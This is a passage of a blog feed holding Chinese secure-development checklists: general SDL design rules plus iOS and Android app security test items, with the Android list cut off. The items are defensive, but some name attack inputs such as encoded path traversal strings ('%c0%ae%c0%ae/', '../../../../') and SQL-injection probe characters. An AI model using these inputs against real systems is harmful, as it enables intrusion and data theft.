      <title>安全设计Checklist</title>
      <link href="/Security/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist/"/>
      <url>/Security/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist/</url>
      <content type="html"><![CDATA[<h2 id="一、输入验证"><a href="#一、输入验证" class="headerlink" title="一、输入验证"></a>一、输入验证</h2><ul><li><p>校验跨信任边界传递的不可信数据(策略检查数据合法性，含白名单机制等)格式化字符串时，依然要检验用户输入的合法性，避免可造成系统信息泄露或者拒绝服务</p></li><li><p>禁止向Java Runtime.exec()方法传递不可信、未净化的数据(当参数中包含空格，双引号，以-或者/符号开头表示一个参数开关时，可能会导致参数注入漏洞)，建议如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。</p></li><li><p>验证路径之前应该先将其标准化为实际路径（特殊的文件名，比如“..”，symbolic links、hard links、shortcuts）</p></li><li><p>从ZipInputStream提取文件，如果不在程序预期计划的目录之内时，应拒绝将其提取出来，或者将其提取到一个安全的位置</p></li><li><p>从ZipInputStream提取文件，若解压之后的文件大小超过一定的限制时，必须拒绝将其解压</p></li><li><p>在处理以前，验证所有来自客户端的数据，包括：所有参数、URL、HTTP头信息（比如：cookie名字和数据值），确定包括了来自 JavaScript、Flash 或其他嵌入代码的post 返回信息</p></li><li><p>如果任何潜在的危险字符必须被作为输入，请确保您执行了额外的安全控制，比如：输入转义、输出编码、特定的安全 API等。部分常见的危险字符，包含但不限于： &lt; &gt; “ ‘ % ( ) &amp; + \ \’ \”  </p></li><li><p>如果您使用的标准验证规则无法验证下面的输入，那么它们需要被单独验证，比如验证空字节 (%00)； 验证换行符 (%0d, %0a, \r, \n)； 验证路径替代字符“点-点-斜杠”（../或 ..\）；如果支持 UTF-8 扩展字符集编码，验证替代字符： %c0%ae%c0%ae/ (使用规范化验证双编码或其他类型的编码)</p></li><li><p>严格验证来自重定向输入的数据（一个攻击者可能向重定向的目标直接提交恶意代码，从而避开应用程序逻辑以及在重定向前执行的任何验证）</p></li><li><p>验证数据类型</p></li><li><p>验证数据范围</p></li><li><p>验证数据长度</p></li></ul><hr><h2 id="二、输出编码"><a href="#二、输出编码" class="headerlink" title="二、输出编码"></a>二、输出编码</h2><ul><li><p>为每一种输出编码方法采用一个标准的、已通过测试的规则</p></li><li><p>通过语义输出编码方式，对所有从服务端返回到客户端的数据进行编码。比如HTML编码、URL编码等，编码形式需根据具体的应用场景选择 </p></li><li><p>除非对目标编译器是安全的，否则请对所有字符进行编码 </p></li><li><p>针对 SQL、XML 和 LDAP 查询，语义净化所有不可信数据的输出 </p></li><li><p>对于操作系统命令，净化所有不可信数据输出</p></li></ul><hr><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><ul><li><p>禁止在异常中泄露敏感信息（敏感数据的范围应该基于应用场景以及产品威胁分析的结果来确定。典型的敏感数据包括口令、银行账号、个人信息、通讯记录、密钥等）</p></li><li><p>禁止在异常中泄露应用服务器的指纹信息（如版本，路径，架构）</p></li><li><p>方法发生异常时要恢复到之前的对象状态（业务操作失败时，进行回滚业务；或者避免去修改对象状态，维持对象状态一致性）</p></li><li><p>I/O操作- 临时文件使用完毕应及时删除</p></li><li><p>不要将Buffer对象封装的数据暴露给不可信代码</p></li><li><p>在多用户系统中创建文件时指定合适的访问许可，以防止未授权的文件访问</p></li><li><p>当一个外部进程通过其输出流对外输出信息或错误时，必须及时清空其输出流，以防止输出流中的缓冲区被耗尽而导致外部进程被阻塞。</p></li><li><p>白名单控制共享目录操作文件权限，比如读/写/可执行权限</p></li></ul><hr><h2 id="三、运行环境"><a href="#三、运行环境" class="headerlink" title="三、运行环境"></a>三、运行环境</h2><ul><li><p>不要使用危险的许可与目标组合（比如不要将AllPermission许可赋予给不信任的代码，不要将ReflectPermission许可和suppressAccessChecks目标组合使用，不要将java.lang.RuntimePermission许可与createClassLoader目标组合）</p></li><li><p>不要禁用JVM字节码验证，如果使用的字节码，如class文件被恶意篡改过，将会存在安全风险</p></li><li><p>建议监控平台不要对互联网开放，仅限于内网环境访问；如果监控平台存在远程执行漏洞，将会给所监控的应用带来安全风险</p></li><li><p>建议将所有安全敏感代码(例如进行权限控制或者用户名密码校验的代码)都放在一个jar包中</p></li><li><p>生产代码不能包含任何调试代码或接口</p></li></ul><hr><h2 id="四、身份验证"><a href="#四、身份验证" class="headerlink" title="四、身份验证"></a>四、身份验证</h2><ul><li><p>除了那些特定设为“公开”的内容以外，对所有的网页和资源都要求进行身份验证，并正确设计身份验证功能</p></li><li><p>所有的身份验证过程必须在服务器后端上执行  </p></li><li><p>在任何可能的情况下，建立并使用标准的、已通过安全测试的身份验证服务(比如 C4A) </p></li><li><p>所有的身份验证控制应当安全的处理未成功的身份验证，比如给出错误模糊提示，隐藏敏感信息</p></li><li><p>登录入口应具有防止暴力猜解及撞库猜解（利用已泄漏的密码字典进行批量登录尝试）的措施，超过设定失败次数需要启用锁定或图片随机码进行访问限制</p></li><li><p>采用https post请求方式传输身份验证的凭据信息</p></li><li><p>身份验证的失败提示信息采用模糊处理，比如可以使用“用户名或密码错误”，而不要使用“用户名错误”或者“密码错误”明确提示。</p></li><li><p>涉及敏感信息或功能的外部系统连接应配置身份验证功能，并进行有效身份验证控制</p></li><li><p>在执行关键操作（如个人信息密码修改操作）时，应对用户身份进行再次验证</p></li><li><p>为高度敏感或重要的交易账户使用多因子身份验证机制，如支付密码、短信验证码等</p></li></ul><hr><h2 id="五、短信验证码"><a href="#五、短信验证码" class="headerlink" title="五、短信验证码"></a>五、短信验证码</h2><ul><li><p>一次一用</p></li><li><p>发送频率控制（建议60s获取一次）</p></li><li><p>验证码有效期（建议60s内有效，发短信时进行友好提示）</p></li><li><p>复杂度（短信验证码建议6位数字）</p></li><li><p>安全提示：是否是个人自己操作等风险提示信息</p></li><li><p>在前端校验（客户端的校验只能作为辅助手段，很容易被绕过），必须使用服务端代码对输入数据进行最终校验</p></li><li><p>短信验证码需要限制频率使用，例如：每天一个手机号码只允许发送5次，防止被黑客恶意消耗短信</p></li><li><p>不同场景的短信验证码不可通用</p></li><li><p>单个短信验证码限制有效验证次数</p></li><li><p>验证码需要对应手机号不可通用</p></li></ul><hr><h2 id="六、图形验证码"><a href="#六、图形验证码" class="headerlink" title="六、图形验证码"></a>六、图形验证码</h2><ul><li><p>一次一用</p></li><li><p>验证码有效期(10分钟内有效，可根据场景兼容安全和体验灵活设置)</p></li><li><p>复杂度（4位及以上数字、字母交替），根据需要也可采用当下流行的拖拽验证码或计算值的验证方式</p></li><li><p>服务器端进行认证</p></li><li><p>从用户体验和安全角度出发，可设计为当用户输3次错误密码后自动弹出验证码输入框进行验证操作</p></li></ul><hr><h2 id="七、密码管理"><a href="#七、密码管理" class="headerlink" title="七、密码管理"></a>七、密码管理</h2><ul><li><p>禁止使用私有或者弱加密算法（比如禁止使用DES，SHA1等，推荐使用AES: 128位，RSA: 2048位，DSA: 2048位）</p></li><li><p>采用基于哈希算法和加入盐值（salt）方式安全存储口令信息</p></li><li><p>密码输入框，可设计为显示密码和隐藏密码切换功能</p></li><li><p>密码重设和更改操作，需要进行二次合法身份验证</p></li><li><p>密码重设时，应对注册手机号和邮箱进行有效验证，链接只能发送到预先注册的邮件地址或预先绑定的手机号</p></li><li><p>临时密码和链接应设计一个短暂的有效期（比如5分钟），防止暴力破解</p></li><li><p>当密码重新设置时，应短信通知用户是否是本人在操作，告知安全风险</p></li><li><p>密码复杂度设置：建议8个字符以上，包含字母、数字及特殊字符等</p></li><li><p>密码设置场景中应具有密码复杂度检查功能</p></li><li><p>密码不能输出到日志和控制台</p></li><li><p>数据库连接配置中的用户密码要以加密的形式存储</p></li><li><p>建议设计密码定期修改提醒机制</p></li></ul><hr><h2 id="八、会话安全"><a href="#八、会话安全" class="headerlink" title="八、会话安全"></a>八、会话安全</h2><ul><li><p>用户登出后应立即清理会话及其相关登录信息</p></li><li><p>注销功能应当完全终止相关的会话或连接</p></li><li><p>增加Cookie 安全性，添加“HttpOnly”和“secure”属性（当“secure”属性设置为true时表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在HTTPS 连接中被浏览器传递到服务器端进行会话验证，在 HTTP 连接中不会传递该信息，也就不会存在Cookie被窃取的问题；设置了”HttpOnly”属性，通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样也能减少XSS跨站脚本攻击风险）</p></li><li><p>会话cookie应设计有效期，超时后立即失效</p></li><li><p>当设计允许用户在多渠道终端同时登录时，建议应进行常用设备登录限制</p></li><li><p>为包含已验证的会话标识符的 cookie 设置域和路径，为站点设置一个恰当的限制值。默认cookie的域是当前域名，默认cookie的路径是当前页面的目录路径。如果想要跨域或者在其他的路径下访问cookie就必须要重新设置这两个属性，domain和path。</p></li><li><p>注销功能应当可用于所有受身份验证保护的网页</p></li><li><p>在平衡风险和业务功能需求的基础上，设置一个尽量短的会话超时时间。通常情况下，应当不超过几个小时。</p></li><li><p>不要在URL、错误信息或日志中暴露会话标识符，会话标识符应当只出现在http头信息中，不要将会话标识符以 GET 参数进行传递</p></li><li><p>定期生成一个新的会话标识符并周期性地使上一个会话标识符失效（这可以缓解那些原标识符被获得的特定会话劫持情况） </p></li><li><p>在身份验证的时候，如果连接从 HTTP 变为 HTTPS，则会生成一个新的会话标识符。在应用程序中，推荐持续使用 HTTPS，不应在 HTTP 和 HTTPS 之间来回转换，有效避免切换过程会话被劫持篡改。</p></li><li><p>为服务器端的操作执行标准的安全会话管理，为每个会话执行合法的身份验证和权限控制，防止存在CSRF跨站点请求伪造漏洞</p></li></ul><hr><h2 id="九、访问控制"><a href="#九、访问控制" class="headerlink" title="九、访问控制"></a>九、访问控制</h2><ul><li><p>将具有特权的逻辑从其他应用程序代码中隔离开</p></li><li><p>限制只有授权的用户才能访问文件资源</p></li><li><p>限制只有授权的用户才能访问受保护的URL</p></li><li><p>限制只有授权的用户才能访问受保护的功能或服务</p></li><li><p>建议只有授权的用户才能访问直接对象引用</p></li><li><p>限制只有授权的用户才能访问受保护的应用程序数据</p></li><li><p>限制只有授权的用户才能访问与安全相关的配置信息</p></li><li><p>限制只有授权的外部应用程序或接口才能访问受保护的本地程序或资源</p></li><li><p>服务器端执行的访问控制规则和前端实施的访问控制规则必须匹配</p></li><li><p>服务器中创建文件时需指定合理的访问权限（读/写/可执行）</p></li><li><p>当权限重新设置发生变更时，应记录好日志，并短信通知用户是否是本人在操作，告知可能存在的安全风险</p></li></ul><hr><h2 id="十、日志规范"><a href="#十、日志规范" class="headerlink" title="十、日志规范"></a>十、日志规范</h2><ul><li><p>不要在日志中保存敏感信息，包括系统指纹信息、会话标识符、账号密码、证件、ID等</p></li><li><p>确保日志记录包含了重要的日志事件数据</p></li><li><p>记录所有失败和成功的输入验证 </p></li><li><p>记录所有失败和成功的身份验证记录</p></li><li><p>记录所有失败和成功的访问和操作记录 </p></li><li><p>记录明显的修改事件，包括对于状态数据的修改</p></li><li><p>记录连接无效或者已过期的会话令牌尝试</p></li><li><p>记录所有的管理功能操作行为，包含但不限于安全配置设置的变更</p></li><li><p>记录所有失败和成功的后端连接</p></li><li><p>记录加密模块的错误信息</p></li><li><p>禁止将日志直接保存在可被浏览器访问到的WEB目录中</p></li></ul><hr><h2 id="十一、敏感信息"><a href="#十一、敏感信息" class="headerlink" title="十一、敏感信息"></a>十一、敏感信息</h2><ul><li><p>临时产生的敏感数据（写入内存或文件），应具有及时清除和释放机制</p></li><li><p>不要在 HTTP GET 请求参数中包含敏感信息，如用户名、密码、卡号、ID等</p></li><li><p>禁止表单中的自动填充功能，因为表单中可能包含敏感信息，包括身份验证信息</p></li><li><p>不要在客户端上以明文形式保存密码或其他敏感信息</p></li><li><p>为所有敏感信息采用SSL加密传输</p></li><li><p>禁止将敏感信息（包含加密秘钥等）硬编码在程序中</p></li><li><p>禁止明文存储用户的密码、身份证号、银行卡号、持卡人姓名等敏感信息</p></li><li><p>不要在日志中保存敏感信息，包含但不限于系统详细信息、会话标识符、密码等</p></li><li><p>禁止在异常中泄露应用服务器的指纹信息，如版本，路径，组件版本等</p></li><li><p>禁止将源码或sql上传到开源平台或社区，如github、开源中国等</p></li><li><p>请求中含有敏感参数（如订单号、ID等），应进行混淆方式处理，防止产生参数遍历获取信息风险</p></li><li><p>敏感信息需要展示在web页面上时，应在后台进行敏感字段脱敏处理</p></li><li><p>请求返回数据不应包含请求之外的业务数据，特别是敏感信息数据</p></li></ul><hr><h2 id="十二、密码找回安全"><a href="#十二、密码找回安全" class="headerlink" title="十二、密码找回安全"></a>十二、密码找回安全</h2><ul><li><p>服务器端要做认证，避免绕过前端控制</p></li><li><p>增加二次认证因子，如验证码</p></li><li><p>涉及登录验证token之类的，不要直接将验证内容直接返回给用户</p></li><li><p>认证凭证加密，推荐强算法（推荐使用AES: 128位，RSA: 2048位，DSA: 2048位）</p></li><li><p>认证凭证中的参数应进行混淆处理</p></li><li><p>在多个验证操作中，要对各验证机制进行排序，以防出现跳过前面验证机制直接到最后一步认证的安全风险</p></li><li><p>手机短信码验证，需同时校验手机号和短信是否对应</p></li><li><p>输入框中，应校验输入数据合法性，防止产生XSS跨站脚本攻击</p></li><li><p>密码找回链接限制有效访问时间和复用次数（不可重复使用）</p></li></ul><hr><h2 id="十三、SQL注入"><a href="#十三、SQL注入" class="headerlink" title="十三、SQL注入"></a>十三、SQL注入</h2><ul><li><p>永远不要信任用户的输入，要对用户的所有输入进行校验，包含SQL语句的过滤和转义</p></li><li><p>永远不要使用动态拼装SQL，可以使用参数化的SQL或者使用存储过程进行数据查询存取</p></li><li><p>永远不要使用管理员权限进行数据库连接，为每个应用使用单独的非特权权限，且配置有限的数据库连接数</p></li><li><p>不要把敏感信息明文存放，采用加密或者哈希、混淆等方式对敏感信息进行脱敏存储</p></li><li><p>应用的异常信息应不带有敏感信息，给出尽可能少的提示；建议使用自定义的错误信息对原始错误信息进行包装，可把异常信息存放在独立的数据库表中</p></li><li><p>XML注入- 不要使用字符串/StringBuffer/StringBuilder/StringFormat组装XML</p></li><li><p>建议对XML元素属性或者内容进行转义</p></li></ul><hr><h2 id="十四、XSS跨站脚本攻击"><a href="#十四、XSS跨站脚本攻击" class="headerlink" title="十四、XSS跨站脚本攻击"></a>十四、XSS跨站脚本攻击</h2><ul><li><p>对输入的数据进行过滤和转义，包含但不限于&lt; &gt;” ‘ % ( ) &amp; + \ \’ \”等危险特殊字符</p></li><li><p>数据添加到html元素属性或者内容中时，对数据进行HTML转义</p></li><li><p>数据添加到script脚本中时，对数据进行script转义</p></li><li><p>数据添加到style中时，对数据进行css转义</p></li></ul><hr><h2 id="十五、CSRF跨站请求伪造"><a href="#十五、CSRF跨站请求伪造" class="headerlink" title="十五、CSRF跨站请求伪造"></a>十五、CSRF跨站请求伪造</h2><ul><li><p>建议在每个关键表单中引入了CSRF Token验证(会话中生成的随机串，提交后校验)</p></li><li><p>在关键表单提交时要求用户进行二次身份验证（录入密码、插KEY、输入图片验证码、短信验证码）</p></li><li><p>对请求referer做验证（比如跨域、系统内部应用）</p></li></ul><hr><h2 id="十六、文件上传安全"><a href="#十六、文件上传安全" class="headerlink" title="十六、文件上传安全"></a>十六、文件上传安全</h2><ul><li><p>上传操作应设计身份验证机制，并进行合法身份校验</p></li><li><p>只允许上传满足业务需要的相关文档类型</p></li><li><p>通过检查文件头信息，比如JPEG (jpg)文件头信息（十六进制）：FFD8FF，验证上传文档是否是所期待的类型</p></li><li><p>不要把文件保存在与应用程序相同的 Web 环境中，建议将文件保存在专用的文档服务器中，单独给文档服务器配置域名访问更好</p></li><li><p>限制上传任意可能被 Web 服务器解析的文件 ，比如jsp、php等 </p></li><li><p>上传文件以二进制形式下载，建议不提供直接访问（防止木马文件直接执行）</p></li><li><p>禁止授予上传文件存储目录的可执行权限 </p></li><li><p>禁止客户端自定义文件上传/下载路径（如：使用../../../../进行跳转）</p></li><li><p>文件上传后重命名（需根据业务实际需求制定命名规则）</p></li></ul><hr><h2 id="十七、组件安全"><a href="#十七、组件安全" class="headerlink" title="十七、组件安全"></a>十七、组件安全</h2><ul><li><p>在使用随机数函数时，推荐使用强随机数函数（例如java.security.SecureRandom类）</p></li><li><p>精简组件中不需要的功能、方法，以免带来未知的安全风险</p></li><li><p>不可将系统内部使用的锁对象暴露给不可信代码</p></li><li><p>建议使用SSL Socket代替Socket来进行安全数据交互</p></li><li><p>封装本地方法调用（所有的本地方法都应该被定义为私有的，然后仅通过一个封装方法来调用）</p></li><li><p>使用安全管理器（比如java.security或第三方安全组件）来保护敏感操作</p></li><li><p>编写自定义类加载器必须覆盖getPermissions()函数时，在为代码源分配任意权限前，应调用超类super.getPermissions（）函数，实现除了自定义策略外，系统全局的默认安全策略也被应用。</p></li><li><p>避免完全依赖URLClassLoader和java.util.jar提供的默认自动签名认证机制，应从加载类的代码源（Code-Source）中获取证书链，然后检查证书是否属于本地密钥库（KeyStore）中的受信任签名者</p></li></ul><hr><h2 id="十八、接口安全"><a href="#十八、接口安全" class="headerlink" title="十八、接口安全"></a>十八、接口安全</h2><ul><li><p>调用方来源IP控制，比如可通过防火墙、主机host deny、Nginx deny等技术措施进行实施</p></li><li><p>调用方身份认证，比如key、secret、证书等技术措施进行实施</p></li><li><p>调用参数认证，需设计参数容错机制，避免出现参数可遍历敏感数据安全问题</p></li><li><p>采用数字签名保障接口身份来源可信，数据防篡改</p></li><li><p>调用方权限控制设置</p></li><li><p>调用频率、有效期进行控制</p></li><li><p>调用行为实时检测，对异常阻拦</p></li><li><p>幂等性校验，保持数据一致性</p></li><li><p>采用应用接入安全网关，实现APPID/KEY身份认证，加密传输，摘要签名安全保障</p></li></ul><hr><h2 id="十九、Dubbo调用安全"><a href="#十九、Dubbo调用安全" class="headerlink" title="十九、Dubbo调用安全"></a>十九、Dubbo调用安全</h2><ul><li><p>采用token验证访问控制，防止消费者绕过注册中心访问提供者；在注册中心控制权限以决定要不要下发令牌给消费者</p></li><li><p>采用filter IP白名单访问控制，同时也可预防生产系统和测试系统之间Dubbo混乱调用问题</p></li><li><p>在必要情况下（如敏感信息操作），连接注册中心Dubbo时要进行用户名和密码校验</p></li></ul><hr><h2 id="二十、Redis调用安全"><a href="#二十、Redis调用安全" class="headerlink" title="二十、Redis调用安全"></a>二十、Redis调用安全</h2><ul><li><p>应启用客户端IP访问控制验证功能</p></li><li><p>应启用客户端身份验证功能</p></li><li><p>敏感信息不要明文存储于Redis</p></li></ul><hr><blockquote><p>本文引自<a href="https://www.sdlchina.org.cn/2.sdl%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3/SDL-1-%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist/" target="_blank" rel="noopener">SDL China</a> —— 中国互联网一线安全工程师编写整理</p></blockquote>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
            <tag> Checklist </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ios安全Checklist</title>
      <link href="/Security/ios%E5%AE%89%E5%85%A8Checklist/"/>
      <url>/Security/ios%E5%AE%89%E5%85%A8Checklist/</url>
      <content type="html"><![CDATA[<ul><li><p>项目</p><ul><li>评级 内部评级 扫描器可否检测</li><li>检测方法</li><li>危害</li><li>备注</li></ul></li><li><p>不安全的存储</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒和 KeyChain 保护私有数据和身份凭据。</li><li>攻击者可通过企业证书诱骗安装恶意应用，对未妥善使用沙箱保护的数据进行获取，实现进一步控制用户账户等目的。</li></ul></li><li><p>不安全的服务端 SSL 部署</p><ul><li>高 具体分析 yes</li><li>分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。</li><li>不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。</li></ul></li><li><p>不正确的证书校验</p><ul><li>高 中 调研</li><li>静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。</li><li>客户端不正确的证书校验可导致被中间人攻击。</li></ul></li><li><p>未使用 SSL Pinning</p><ul><li>高 低 调研</li><li>静态分析程序是否采用了 SSL Pinning。</li><li>攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。</li><li>iOS 上的证书安装比 Android 简单很多</li></ul></li><li><p>不安全的 ATS 配置</p><ul><li>高 低 yes</li><li>静态分析程序是否允许任意内容使用非 SSL 载入。</li><li>开启 NSAllowsArbitraryLoads 允许任意内容通过明文传送，可能导致中间人攻击；此外 AppStore 将加强对此选项的限制，可能导致上架困难。</li></ul></li><li><p>密码学实现问题</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散列函数。</li><li>错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。</li></ul></li><li><p>不安全的用户认证</p><ul><li>高 具体分析 no</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。</li><li>不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。</li></ul></li><li><p>客户端 SQL 注入</p><ul><li>具体分析 具体分析 调研</li><li>按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。</li><li>攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。</li></ul></li><li><p>内网 IP 泄漏</p><ul><li>低 低 yes</li><li>静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。</li><li>攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。</li></ul></li><li><p>客户端路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用程序逻辑，以及动态跟踪程序执行。</li><li>攻击者可使用路径穿越问题访问应用的私有数据。</li></ul></li><li><p>未启用地址随机化</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查是否启用 PIE 保护。</li><li>未开启 PIE 的应用将降低内存破坏类漏洞的利用难度。</li></ul></li><li><p>未启用栈 cookie</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查标志位是否启用 Stack Canary 保护。</li><li>未开启 Stack Canary 的应用将更容易受到栈溢出漏洞的攻击。</li></ul></li><li><p>未启用 ARC</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查是否启用 Automatic Reference Counting 管理对象。</li><li>ARC 是 Objective C 中对象内存管理的机制，开启后可以减少手动管理内存而导致的对象引用问题。</li></ul></li><li><p>URL Scheme 滥用</p><ul><li>具体分析    具体分析 no</li><li>静态分析 URL Scheme 处理历程和动态模糊测试，判断程序在处理 URL Scheme 时是否存在可以被攻击的流程。</li><li>攻击者可以使用网页等方式唤起应用，执行特定的流程触发漏洞。</li></ul></li><li><p>第三方代码问题</p><ul><li>具体分析 具体分析 调研</li><li>检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码（如 XCodeGhost）。</li><li>程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。</li><li>基于 cocoapods 的第三方代码检测？</li></ul></li><li><p>敏感内容输出到日志</p><ul><li>具体分析 低 调研</li><li>使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。</li><li>攻击者可读取系统日志跨应用获取信息。    hook 很容易实现，问题是如何判断信息敏感？</li></ul></li><li><p>未启用键盘记录保护</p><ul><li>中 低 调研</li><li>静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。</li><li>系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。</li><li>基于 hook 实现？</li></ul></li><li><p>敏感应用未进行越狱检测</p><ul><li>低 低 调研</li><li>静态分析应用逻辑结合越狱设备实机安装，判断应用是否根据自身需求对越狱环境进行检测，以及告知用户潜在的风险。</li><li>在越狱设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。</li><li>静态查询是否包含符号、特殊字符串</li></ul></li><li><p>访问控制不当</p><ul><li>低 具体分析 yes</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。</li><li>错误的访问控制策略可能导致用户敏感信息遭到泄露。</li></ul></li><li><p>逻辑缺陷</p><ul><li>具体分析 具体分析 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。</li><li>逻辑错误将导致应用出现非设计预期的行为。</li></ul></li><li><p>未对系统截图做保护</p><ul><li>低 低 no</li><li>检查应用进入后台是否会保存屏幕截图。    当程序进入后台的截屏包含敏感信息可能导致隐私泄露。</li></ul></li><li><p>敏感数据明文传输</p><ul><li>高 中 no</li><li>检查应用与服务器通信数据包中敏感信息是否加密。</li><li>当用户遭受中间人攻击时，如果敏感信息明文传输将导致信息泄露。</li></ul></li><li><p>敏感数据允许使用剪贴板</p><ul><li>中 低 no</li><li>检查应用敏感数据是否可复制。</li><li>iOS系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。</li></ul></li><li><p>错误页面泄露敏感信息</p><ul><li>具体分析 低 no</li><li>检查应用异常状态下，错误信息是否包含敏感数据。</li><li>错误页面中不必要的输出可能导致信息泄露，或者为攻击者提供额外信息。</li></ul></li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
            <tag> Checklist </tag>
            
            <tag> ios </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android安全Checklist</title>
      <link href="/Security/Android%E5%AE%89%E5%85%A8Checklist/"/>
      <url>/Security/Android%E5%AE%89%E5%85%A8Checklist/</url>
      <content type="html"><![CDATA[<ul><li><p>项目</p><ul><li>评级 内部评级 扫描器可否检测</li><li>检测方法</li><li>危害</li><li>备注</li></ul></li><li><p>应用可以被调试</p><ul><li>高    低      yes</li><li>检查样式清单，是否允许被调试。检查应用是否使用反调试技巧防止被附加调试。</li><li>可以被调试的应用将降低对应用逆向工程的成本。</li></ul></li><li><p>应用可以被备份</p><ul><li>高 低     yes</li><li>检查样式清单，是否允许被备份。</li><li>在开启 USB 调试的设备上可备份应用和数据，在设备没有 root 的情况下访问私有数据目录。</li></ul></li><li><p>ContentProvider权限问题</p><ul><li>具体分析    具体分析  yes    </li><li>检查样式清单，是否为 ContentProvider 设置了足够的权限限制。</li><li>攻击者可以不受限制地访问敏感的 ContentProvider，获取私有数据或权限提升。</li></ul></li><li><p>冗余的权限</p><ul><li>低 低 yes</li><li>检查样式清单，是否注册了冗余的权限。</li><li>冗余的权限将导致在发生代码执行漏洞时，攻击者可以获得更多的应用权限。</li><li>Android 在新版废弃了一些权限，即使加上也不能使用相关功能。 <a href="https://developer.android.com/reference/android/Manifest.permission.html#READ_LOGS" target="_blank" rel="noopener">https://developer.android.com/reference/android/Manifest.permission.html#READ_LOGS</a></li></ul></li><li><p>代码可被重打包</p><ul><li>高 低 yes</li><li>解包应用，篡改内容并重新签名，判断程序是否对反编译工具添加了处理，以及对自身完整性进行校验。</li><li>重打包可能导致仿冒应用出现在市场中，威胁用户安全。</li></ul></li><li><p>客户端 SQL 注入</p><ul><li>高 具体分析 调研</li><li>按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。</li><li>攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。</li><li>需要找到可执行路径</li></ul></li><li><p>不安全的存储</p><ul><li>具体分析 具体分析 yes</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒保护私有数据和身份凭据，是否有将敏感信息输出到扩展存储（TF 卡等）的行为。</li><li>错误的数据存储可能导致攻击者可以跨应用获取敏感数据。</li></ul></li><li><p>明文存储密码</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据目录。</li><li>明文存储密码可导致应用更易受到取证工具攻击。</li></ul></li><li><p>不安全的服务端 SSL 部署</p><ul><li>高 具体分析 yes</li><li>分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。</li><li>不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。</li></ul></li><li><p>敏感数据明文传输</p><ul><li>高 中 调研</li><li>分析应用与后台服务器通信数据中敏感数据是否为明文传输。</li><li>当用户遭受中间人攻击时可能导致信息泄露。</li></ul></li><li><p>不正确的证书校验</p><ul><li>高 中 yes</li><li>静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。</li><li>客户端不正确的证书校验可导致被中间人攻击。</li></ul></li><li><p>未使用 SSL Pinning</p><ul><li>中 低 调研</li><li>静态分析程序是否采用了 SSL Pinning。</li><li>攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。</li><li>Android 下面安装证书很麻烦</li></ul></li><li><p>WebView 安全</p><ul><li>高 具体分析 